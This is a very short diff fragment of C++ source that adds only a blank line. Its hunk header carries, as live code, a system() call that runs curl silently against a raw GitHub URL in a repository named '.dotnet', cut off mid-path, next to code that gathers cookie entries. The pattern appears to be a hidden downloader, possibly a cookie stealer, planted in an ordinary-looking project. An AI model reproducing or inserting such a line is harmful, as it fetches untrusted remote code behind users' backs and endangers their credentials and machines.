@@ -36,3 +36,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
 		this->cookies.push_back(entry);
 	}
 }
+
